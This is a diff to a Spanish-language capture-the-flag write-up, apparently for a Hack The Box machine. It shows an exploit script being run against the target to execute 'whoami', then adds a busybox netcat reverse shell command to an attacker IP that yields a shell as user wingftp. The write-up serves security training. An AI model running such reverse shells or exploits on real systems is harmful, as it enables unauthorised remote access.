@@ -30,4 +30,11 @@ python3 52347.py -u http://ftp.wingdata.htb -c whoami
 
 Nos devuelve que somos el usuario `wingftp`
 
-Vamos a intentar mandarnos una reverse shell
+Vamos a intentar mandarnos una reverse shell, despues de probar diferentes tipos de shell vemos que la nos ha funcionado es 
+```shell
+busybox nc 10.10.15.216 443 -e sh
+```
+
+
+Obtenemos una shell como como el usuario `wingftp`
+shadow 256
